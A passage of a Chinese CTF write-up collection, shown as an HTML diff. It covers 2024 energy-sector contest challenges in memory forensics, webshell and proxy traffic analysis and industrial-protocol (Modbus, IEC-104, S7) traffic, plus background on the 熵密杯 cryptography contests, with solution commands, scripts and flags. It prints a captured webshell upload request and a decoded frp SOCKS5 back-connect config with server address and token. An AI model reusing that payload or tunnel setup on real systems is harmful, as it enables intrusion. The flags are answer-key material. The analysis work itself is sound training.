'X'), (52, 'X'), (53, 'X'), (61, 'X')], [(1, 'X'), (2, 'X'), (15, 'X'), (29, 'X'), (30, 'X'), (49, 'X'), (61, 'X')], [(60, 'X'), (61, 'X')], [(57, 'X'), (58, 'X'), (59, 'X'), (60, 'X')]]
+</code></pre>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%9B%BE%E7%89%871.png" alt="损坏的图片1" /></p>
+<p>FLAG：<code>flag{2024nyjy777*}</code></p>
+<h2 id="forensic"><a class="header" href="#forensic">Forensic</a></h2>
+<h3 id="win内存取证3"><a class="header" href="#win内存取证3">win内存取证3</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/win%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%813.png" alt="win内存取证3" /></p>
+<blockquote>
+<p>分析win内存镜像，电脑中有一张记录flag的图片，请找出来，并获得flag,flag格式为flag{xx}</p>
+</blockquote>
+<p>知识点：<code>内存取证</code>、<code>文件提取</code></p>
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<pre><code class="language-bash">$ vol -f mem.raw windows.filescan &gt; filescan
+$ cat filescan | grep -i -E "jpg|jpeg|png|gif"
+0x7db0fc10      \Users\ctf\Desktop\777.png
+0x7dd33dd0      \Users\ctf\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper.jpg
+0x7fb21c40      \Windows\SysWOW64\pngfilt.dll
+0x7fc5c6c0      \Users\Public\Pictures\Sample Pictures\Desert.jpg
+0x7fdda170      \Windows\System32\pngfilt.dll
+0x7fed75c0      \Users\Public\Pictures\Sample Pictures\Chrysanthemum.jpg
+$ vol -f mem.raw windows.dumpfiles --physaddr 0x7db0fc10
+</code></pre>
+<p>FLAG：<code>flag{2shygsbnajwjji}</code></p>
+<h3 id="代理流量"><a class="header" href="#代理流量">代理流量</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E4%BB%A3%E7%90%86%E6%B5%81%E9%87%8F.png" alt="代理流量" /></p>
+<blockquote>
+<p>有一台Web应用服务器发现被攻击者获取了权限，并对内网做了扫描。请尝试分析攻击过程，并找到代理工具的回连地址及端口，提交地址端口，示意：10.10.10.10:8080，提交flag为flag{10.10.10.10:8080},flag格式flag{x}</p>
+</blockquote>
+<p>知识点：<code>流量分析</code>、<code>webshell流量分析</code></p>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<p>343 号包上传 <code>frpc.ini</code> 文件</p>
+<pre><code class="language-http">POST /1.php HTTP/1.1
+Host: 192.168.2.197:8081
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1374
+Connection: close
+
+aaa=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2228%22.%22f72%22%3Becho%20%40asenc(%24output)%3Becho%20%22f486%22.%2211f4%22%3B%7Dob_start()%3Btry%7B%24f%3Dbase64_decode(substr(%24_POST%5B%22j68071301598f%22%5D%2C2))%3B%24c%3D%24_POST%5B%22xa5d606e67883a%22%5D%3B%24c%3Dstr_replace(%22%5Cr%22%2C%22%22%2C%24c)%3B%24c%3Dstr_replace(%22%5Cn%22%2C%22%22%2C%24c)%3B%24buf%3D%22%22%3Bfor(%24i%3D0%3B%24i%3Cstrlen(%24c)%3B%24i%2B%3D2)%24buf.%3Durldecode(%22%25%22.substr(%24c%2C%24i%2C2))%3Becho(%40fwrite(fopen(%24f%2C%22a%22)%2C%24buf)%3F%221%22%3A%220%22)%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;j68071301598f=FBL3Zhci93d3cvaHRtbC9mcnBjLmluaQ%3D%3D&amp;xa5d606e67883a=5B636F6D6D6F6E5D0A7365727665725F61646472203D203139322E3136382E3135372E3131310A7365727665725F706F7274203D20383838380A746F6B656E3D6659346533766372535941486A6A464B7A4B4B380A0A5B746573745F736F636B355D0A74797065203D207463700A72656D6F74655F706F7274203D383131310A706C7567696E203D20736F636B73350A706C7567696E5F75736572203D2050787059784642644E70370A706C7567696E5F706173737764203D2059454453756E70480A7573655F656E6372797074696F6E203D20747275650A7573655F636F6D7072657373696F6E203D20747275650A
+</code></pre>
+<p>十六进制解码得到 <code>frpc.ini</code> 文件内容：</p>
+<pre><code class="language-ini">[common]
+server_addr = 192.168.157.111
+server_port = 8888
+token=fY4e3vcrSYAHjjFKzKK8
+
+[test_sock5]
+type = tcp
+remote_port =8111
+plugin = socks5
+plugin_user = PxpYxFBdNp7
+plugin_passwd = YEDSunpH
+use_encryption = true
+use_compression = true
+</code></pre>
+<p>FLAG：<code>flag{192.168.157.111:8888}</code></p>
+<h3 id="apt窃密事件溯源"><a class="header" href="#apt窃密事件溯源">APT窃密事件溯源</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/APT%E7%AA%83%E5%AF%86%E4%BA%8B%E4%BB%B6%E6%BA%AF%E6%BA%90.png" alt="APT窃密事件溯源" /></p>
+<blockquote>
+<p>某单位遭遇威胁组织攻击，威胁组织对攻陷的主机进行了信息收集并窃取机密信息，安防设备捕获到攻击流量（hack.pcap），结合提供的开源APT分析报告，研判发起本次攻击事件的APT组织窃取的文件。flag格式为flag{}</p>
+</blockquote>
+<p>知识点：<code>流量分析</code></p>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<p>FLAG：<code>flag{C:\Users\wdr\Desktop\test\888888888.txt}</code></p>
+<h3 id="失窃的mp4文件"><a class="header" href="#失窃的mp4文件">失窃的MP4文件</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E5%A4%B1%E7%AA%83%E7%9A%84MP4%E6%96%87%E4%BB%B6.png" alt="失窃的MP4文件" /></p>
+<blockquote>
+<p>已知黑客入侵某内部系统后，使用自定义的协议格式回传窃取的高价值mp4文件，请针对目标流量还原被窃取文件，找到flag标识，格式：flag{XXXX_XXXX_XXXX_XXXX}</p>
+</blockquote>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<!-- 如果为静态 flag，需写明 flag -->
+<p>FLAG：<code>flag{}</code></p>
+<h3 id="寻找矿池地址"><a class="header" href="#寻找矿池地址">寻找矿池地址</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E5%AF%BB%E6%89%BE%E7%9F%BF%E6%B1%A0%E5%9C%B0%E5%9D%80.png" alt="寻找矿池地址" /></p>
+<blockquote>
+<p>请分析服务器（root/Root@123)被挖矿的地址连接池，找到域名和端口，flag为flag{域名:端口},flag格式为flag{xxxx}</p>
+</blockquote>
+<p>在线环境，无附件。</p>
+<p>FLAG：<code>flag{www.baiiduu.com:3333}</code></p>
+<h2 id="ics"><a class="header" href="#ics">ICS</a></h2>
+<h3 id="modbus"><a class="header" href="#modbus">modbus</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/modbus.png" alt="modbus" /></p>
+<blockquote>
+<p>先运行服务器再运行客户端，产生流量。找到流量中的flag</p>
+</blockquote>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<!-- 如果为静态 flag，需写明 flag -->
+<p>FLAG：<code>flag{sgcc_modbus_hack}</code></p>
+<h3 id="104协议"><a class="header" href="#104协议">104协议</a></h3>
+<blockquote>
+<p>题目描述</p>
+</blockquote>
+<!-- 如果题目有提示，应给出提示 -->
+<ul>
+<li>提示 1：</li>
+<li>提示 2：</li>
+</ul>
+<p>知识点：<code>流量分析</code>、<code>工控流量分析</code>、<code>IEC 60870-104协议</code></p>
+<p>解题步骤、关键截图、代码</p>
+<pre><code class="language-bash">tshark -r 104_2.pcapng -T fields -e "iec60870_asdu.ioa"
+</code></pre>
+<p><code>ZmxhZ3syMDI0bnlhcWdmenNsfQ==</code></p>
+<!-- 如果题目为静态flag，需给出flag -->
+<p>FLAG：<code>flag{2024nyaqgfzsl}</code></p>
+<h3 id="这是一个秘密"><a class="header" href="#这是一个秘密">这是一个秘密</a></h3>
+<!-- 如果题目有提示，应给出提示 -->
+<ul>
+<li>提示 1：</li>
+<li>提示 2：</li>
+</ul>
+<p>知识点：<code>流量分析</code>、<code>工控流量分析</code>、<code>s7comm协议</code></p>
+<p>解题步骤、关键截图、代码</p>
+<pre><code class="language-bash">
+</code></pre>
+<p><code>YWx3YXlzZm9yd2FyZCEh</code></p>
+<!-- 如果题目为静态flag，需给出flag -->
+<p>FLAG：<code>flag{alwaysforward!!}</code></p>
+<h3 id="工控流量分析二"><a class="header" href="#工控流量分析二">工控流量分析二</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%BA%8C.png" alt="工控流量分析二" /></p>
+<blockquote>
+<p>请你帮助小刘分析流量包，黑客在PLC中写入了flag。flag形如下：flag{xx}</p>
+</blockquote>
+<p>知识点：<code>流量分析</code>、<code>工控流量分析</code>、<code>modbus协议</code>、<code>文件提取</code></p>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<pre><code class="language-shell">tshark -r sample.pcap -Y "modbus.func_code == 16 and ip.dst == 192.168.4.80" -T fields -e "modbus.regnum16" 
+tshark -r sample.pcap -Y "modbus.func_code == 16 and ip.dst == 192.168.4.80" -T fields -e "modbus.regval_uint16"
+</code></pre>
+<p>导出后前面一些行删除掉。</p>
+<pre><code class="language-python">import struct
+
+out1 = '''501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600
+300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349
+601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650
+20,21,22,23,24,25,26,27,28,29,30
+651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730
+400,401,402,403,404,405,406,407,408,409,410
+731,732,733,734,735,736,737,738,739,740,741
+800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899
+1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030
+950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999'''
+
+out2 = '''35152,20039,3338,6666,0,13,18760,17490,0,202,0,21,2050,0,136,28646,1280,1,43337,17473,21624,40173,39361,28356,8204,17463,22015,65431,59649,2489,7907,3108,56940,43897,10006,6619,14467,16858,41909,62994,41606,44967,4880,65305,51531,5154,31113,16932,12113,35044,9482,37308,17441,57313,60529,7293,53338,7139,65139,13632,24398,11964,6379,15832,7641,16957,39379,28610,39611,18886,26159,36901,37015,23523,60088,50288,25863,63143,46015,4715,9009,3261,35387,32311,31246,54672,34766,25393,27052,42714,29672,57140,13552,61978,6631,49860,21387,19138,15580,19688
+2022,14230,24407,51417,53367,43434,45988,56534,22242,16708,26256,3965,43630,27296,31279,58771,37677,18394,62888,15466,41572,59268,62539,18159,37076,1443,63116,9402,31914,10314,640,362,25418,19391,47604,42030,35157,12299,9799,39015,21976,25878,20462,37811,13614,12607,61846,49399,49268,47255
+34703,38328,25916,15313,37803,26357,6463,37827,46004,12283,58818,21306,15272,38945,56841,36045,11178,13247,48014,32635,55718,38295,55334,6854,16077,9148,26104,22653,7350,63315,53160,32306,40793,32112,21847,191,30502,31458,3525,14898,50255,51672,33909,46723,55750,11579,20347,45572,25029,28961
+21704,5525,6603,23280,2557,34653,62021,49159,53649,46083,586
+22986,17646,9046,22688,42952,5094,52592,6008,28361,22549,58445,25671,24235,4032,3742,62769,26282,37687,33625,50386,47775,59075,58524,56196,50982,56404,59623,31234,6129,62130,47090,26678,14569,11513,38430,24104,18732,48310,39067,5949,9144,4594,20071,28403,50272,5835,52684,39510,15880,40327,24560,54406,44102,52980,52671,59758,62162,31914,30091,21070,16366,15858,45735,59187,38276,52608,51571,28501,40351,16327,52701,19208,35838,5138,34120,24226,4297,19220,8825,35138
+31233,8421,33855,27650,21086,0,0,18757,20036,44610,24706
+32256,14820,53603,31138,59844,0,0,18757,20036,44610,24706
+35152,20039,3338,6666,0,13,18760,17490,0,255,65280,21,2050,0,11,34589,31488,1,10825,17473,21624,40173,22737,3779,8200,54437,65535,52206,41225,24840,10090,15290,35963,29190,3768,621,22107,27429,61789,48290,5112,18340,59393,18641,912,41479,8261,3904,35358,32788,15616,10618,82,62464,42216,328,53507,28792,35946,44519,41397,18151,62439,27708,61118,50752,9275,65306,27990,57633,10202,16091,29095,37839,59718,34717,27702,60284,707,21676,62201,38919,40270,42680,47608,10248,31631,41968,61956,4805,34833,5175,58028,38762,3252,10305,48471,3392,57731,20007
+31233,8421,33855,27650,21086,0,0,18757,20036,44610,24706
+8144,6781,47248,36128,20925,47799,34232,15712,41049,23513,12467,45137,35669,28152,49490,48267,48864,46474,35737,13595,6752,32302,38584,61744,33721,10990,4652,23242,52213,8821,12846,60357,29151,43765,12387,39897,47789,3491,53137,28899,14713,57945,7993,24831,63201,49280,33720,5769,47340,31152'''
+
+out1 = out1.replace('\n', ',').split(',')
+out2 = out2.replace('\n', ',').split(',')
+
+lst = [(int(a), int(b)) for a, b in zip(out1, out2) if int(a) &gt; 500 and int(a) &lt; 800]
+lst.sort(key=lambda x: x[0])
+print(lst)
+
+with open("a.png", "wb") as f:
+    for k, v in lst:
+        bt = struct.pack("&gt;H", v)
+        f.write(bt)
+</code></pre>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%BA%8C-flag.png" alt="工控流量分析二" /></p>
+<!-- 如果为静态 flag，需写明 flag -->
+<p>FLAG：<code>flag{Welcome_To_thE_coMPEtition}</code></p>
+<h3 id="nywl2024002"><a class="header" href="#nywl2024002">NYWL2024002</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/NYWL2024002.png" alt="NYWL2024002" /></p>
+<blockquote>
+<p>附件是一个PLC项目文件以及相关的截图，请分析里面的PLC程序，求MDO的值为多少时可使MD4的值为9498.563，flag为MD0的值，flag格式为flagt{xxx},例如MD0的值是123，那么flag就是flag{123}</p>
+</blockquote>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<!-- 如果为静态 flag，需写明 flag -->
+<p>FLAG 为<code>flag{}</code></p>
+<h3 id="data-encry"><a class="header" href="#data-encry">data-encry</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/data-encry.png" alt="data-encry" /></p>
+<blockquote>
+<p>编译文件，执行文件，获取flag,flag格式flag{xxx}</p>
+</blockquote>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<!-- 如果为静态 flag，需写明 flag -->
+<p><code>kqfl{xlhh-djx-qqar}</code>，使用 <a href="https://gchq.github.io/CyberChef/#recipe=ROT13_Brute_Force(true,false,false,100,0,true,&#x27;flag&#x27;)&amp;input=a3FmbHt4bGhoLWRqeC1xcWFyfQ&amp;ieol=CRLF">CyberChef</a> 的<code>ROT13_Brute_Force</code>模块爆破即可。</p>
+<p>FLAG：<code>flag{sgcc-yes-llvm}</code></p>
+<h2 id="参考资料-3"><a class="header" href="#参考资料-3">参考资料</a></h2>
+<ul>
+<li><a href="https://github.com/i1ikey0u/CTF_2024NYXH_YS-JS/">https://github.com/i1ikey0u/CTF_2024NYXH_YS-JS/</a></li>
+<li><a href="https://www.cnblogs.com/wgf4242/p/18259556">https://www.cnblogs.com/wgf4242/p/18259556</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2024年能源网络安全大赛预赛"><a class="header" href="#2024年能源网络安全大赛预赛">2024年能源网络安全大赛预赛</a></h1>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_Qualifier/./images/all.png" alt="题目概览" /></p>
+<h2 id="能源安全杂项"><a class="header" href="#能源安全杂项">能源安全杂项</a></h2>
+<h3 id="modbus-1"><a class="header" href="#modbus-1">Modbus</a></h3>
+<blockquote>
+<p>奇怪的流量</p>
+</blockquote>
+<pre><code class="language-shell">tshark -r modbus.pcapng  -Y modbus -T fields -e modbus.regval_uint16
+</code></pre>
+<p>去除 <code>65535</code></p>
+<p>FLAG：<code>flag{ee92722f-973c-46c9-a05e-d5e9f3540529}</code></p>
+<h3 id="browser"><a class="header" href="#browser">browser</a></h3>
+<blockquote>
+<p>找到flag，flag格式为flag{xxx}</p>
+</blockquote>
+<h2 id="能源工控安全分析"><a class="header" href="#能源工控安全分析">能源工控安全分析</a></h2>
+<h3 id="gooooose"><a class="header" href="#gooooose">gooooose</a></h3>
+<h3 id="ip找不到了"><a class="header" href="#ip找不到了">IP找不到了</a></h3>
+<h3 id="fins协议分析"><a class="header" href="#fins协议分析">Fins协议分析</a></h3>
+<h3 id="来运行plc程序吧"><a class="header" href="#来运行plc程序吧">来运行PLC程序吧</a></h3>
+<h3 id="decproj"><a class="header" href="#decproj">decproj</a></h3>
+<h2 id="能源网络系统安全"><a class="header" href="#能源网络系统安全">能源网络系统安全</a></h2>
+<h3 id="testjava"><a class="header" href="#testjava">testJava</a></h3>
+<h3 id="web_gohttp"><a class="header" href="#web_gohttp">web_gohttp</a></h3>
+<h3 id="web_ssrf"><a class="header" href="#web_ssrf">web_ssrf</a></h3>
+<h2 id="能源逆向工程"><a class="header" href="#能源逆向工程">能源逆向工程</a></h2>
+<h3 id="ezsys"><a class="header" href="#ezsys">ezsys</a></h3>
+<h3 id="easy_re"><a class="header" href="#easy_re">easy_re</a></h3>
+<h2 id="能源行业加密技术"><a class="header" href="#能源行业加密技术">能源行业加密技术</a></h2>
+<h3 id="seeyouagain"><a class="header" href="#seeyouagain">seeyouagain</a></h3>
+<h3 id="找到钥匙"><a class="header" href="#找到钥匙">找到钥匙</a></h3>
+<h2 id="能源数据安全分析"><a class="header" href="#能源数据安全分析">能源数据安全分析</a></h2>
+<h3 id="结构化数据分类分级识别"><a class="header" href="#结构化数据分类分级识别">结构化数据分类分级识别</a></h3>
+<h2 id="参考资料-4"><a class="header" href="#参考资料-4">参考资料</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/aFbkQAwuou9H9TiR9neyIw">https://mp.weixin.qq.com/s/aFbkQAwuou9H9TiR9neyIw</a></li>
+<li><a href="https://mp.weixin.qq.com/s/QI5rd8ZKbEg_MTMHmbbmCw">https://mp.weixin.qq.com/s/QI5rd8ZKbEg_MTMHmbbmCw</a></li>
+<li><a href="https://www.cnblogs.com/wgf4242/p/18159094">https://www.cnblogs.com/wgf4242/p/18159094</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="熵密杯"><a class="header" href="#熵密杯">熵密杯</a></h1>
+<h2 id="2025年第三届熵密杯密码安全挑战赛"><a class="header" href="#2025年第三届熵密杯密码安全挑战赛">2025年第三届熵密杯密码安全挑战赛</a></h2>
+<p>此次挑战赛<strong>由中国密码学会、重庆市密码管理局指导，国家信息技术安全研究中心主办</strong>，采取<strong>线下赛闯关模式</strong>，模拟重要系统典型密码应用场景，参赛战队通过发现典型场景中存在的密码算法模式配置、密钥管理、密码协议、密码服务、网络安全等方面密码应用安全缺陷和网络安全漏洞，综合检验各个战队密码应用常见安全缺陷的分析识别、密码算法等功能调用的编程实现、网络协议数据包分析及相关工具使用、网络和系统配置检查、源代码审计等技能水平。<sup class="footnote-reference" id="fr-2025-公告-1"><a href="#footnote-2025-公告">1</a></sup></p>
+<p>来自全国 31 个省（自治区、直辖市）的 600 余名密码专业技术人才，组成 205 支战队，同场竞技，紧贴智能网联汽车典型密码应用场景，围绕预设的密码算法、密钥管理、密码协议等安全缺陷，闯关夺旗。<sup class="footnote-reference" id="fr-2025-info-1"><a href="#footnote-2025-info">2</a></sup></p>
+<h2 id="2024年第二届熵密杯密码安全挑战赛"><a class="header" href="#2024年第二届熵密杯密码安全挑战赛">2024年第二届熵密杯密码安全挑战赛</a></h2>
+<p>此次赛事<strong>由中国密码学会、宁夏回族自治区密码管理局、中国科学院大学密码学院支持，国家信息技术安全研究中心联合密码科技国家工程研究中心主办</strong>，采取线下赛方式，通过模拟仿真重要行业领域密码应用典型场景，预置密码算法模式配置、密钥管理、密码协议、密码服务、网络安全等方面密码应用安全缺陷和网络安全漏洞,综合检验参赛队伍在密码应用安全缺陷识别、密码算法 功能编程调用、网络协议数据解析、网络和系统配置核查、源代码审计等方面的实战技能。[^2024-公告]</p>
+<p>本届赛事召集了来自全国 29 个省区市的 50 家知名高校、91 家测评机构、8 家安全企业，共计 448 名密码专业技术人才参赛。</p>
+<p>中国科学技术大学“Nebula 战队”一骑绝尘，拔得头筹，豪取冠军并获特等奖。卫冕冠军上海交通大学“0ops 战队”凭借后程发力，强势逆转勇夺亚军，携吉林大学“Spirit 战队”、西北大学“NwuSec 战队”、山东大学“HASHTEAM 战队”分获一等奖。浙江大学“来自东方的神秘力量”等 5 支战队获二等奖。10 支战队获三等奖。30 支战队获优胜奖。</p>
+<p>[^2024-公告]：<a href="https://soc.ucas.ac.cn/index.php/en/xwgs/tgzs/1184-2024-07-06-08-31-05">关于举办第二届“熵密杯”密码应用安全挑战赛公告</a></p>
+<h2 id="2023年首届熵密杯密码应用安全竞赛"><a class="header" href="#2023年首届熵密杯密码应用安全竞赛">2023年首届熵密杯密码应用安全竞赛</a></h2>
+<p>由中国密码学会支持，2023 商用密码大会执委会主办，南京赛宁信息技术有限公司提供技术支撑的首届“熵密杯”密码应用安全竞赛于 8 月 10 日在郑州举办。</p>
+<hr>
+<ol class="footnote-definition"><li id="footnote-2025-公告">
+<p><a href="https://www.cacrnet.org.cn/site/content/1599.html">关于举办第三届“熵密杯”密码安全挑战赛公告</a> <a href="#fr-2025-公告-1">↩</a></p>
+</li>
+<li id="footnote-2025-info">
+<p><a href="https://mp.weixin.qq.com/s/HMYCAj1facDLfU842wGJlg">第三届“熵密杯”密码安全挑战赛开赛啦！</a> <a href="#fr-2025-info-1">↩</a></p>
+</li>
+</ol><div style="break-before: page; page-break-before: always;"></div><h1 id="2025年第三届熵密杯密码安全挑战赛-1"><a class="header" href="#2025年第三届熵密杯密码安全挑战赛-1">2025年第三届熵密杯密码安全挑战赛</a></h1>
+<h2 id="参考资料-5"><a class="header" href="#参考资料-5">参考资料</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/1jCLHhTYWZ4ml1uoIiSBEg">WriteUp | 第三届“熵密杯”密码安全挑战赛解题思路分享</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2024年第二届熵密杯密码安全挑战赛-1"><a class="header" href="#2024年第二届熵密杯密码安全挑战赛-1">2024年第二届熵密杯密码安全挑战赛</a></h1>
+<p><img src="cryptocup/2024/./images/scoreboard.png" alt="积分板" /></p>
+<ul>
+<li>题目背景</li>
+</ul>
+<p>你是一位公司内部工作人员，你们公司最近上线了一个协同签名系统，所有重要事项由总经理通过该系统进行签名确认。有一天，你无意中接触到后台系统管理员的房间，里面有一台未上锁的电脑，其中似乎有着可以接触到公司关键操作的线索。</p>
+<ul>
+<li>最终目标</li>
+</ul>
+<p>你需要利用你的技能和智慧，利用所有可能的线索，搜寻系统中密码应用潜在的漏洞，最终实现完成一次“非法”的签名！</p>
+<blockquote>
+<p>注意：你并不是恶意黑客，你的目的是测试系统的安全性，找出可能存在的密码应用漏洞，以便系统开发人员加强系统防御措施。</p>
+</blockquote>
+<ul>
+<li>解题路径</li>
+</ul>
+<p>本次竞赛共设置初始谜题和夺旗闯关两个环节，其中初始谜题设置 3 道题，闯关夺旗设置 5 道题，共计 8 道题。</p>
+<p><img src="cryptocup/2024/./images/path.png" alt="题目拓扑" /></p>
+<h2 id="初始谜题"><a class="header" href="#初始谜题">初始谜题</a></h2>
+<h3 id="初始谜题1"><a class="header" href="#初始谜题1">初始谜题1</a></h3>
+<pre><code>请下载题目附件，并获取在线场景，双击运行附件中的客户端，输入IP地址和端口号连接服务端。请认真分析题目附件中的代码，根据服务端所给出的密文，解密出所对应的明文消息，并提交至服务端。
+</code></pre>
+<pre><code class="language-python">from sympy import Mod, Integer
+from sympy.core.numbers import mod_inverse
+
+# 模数
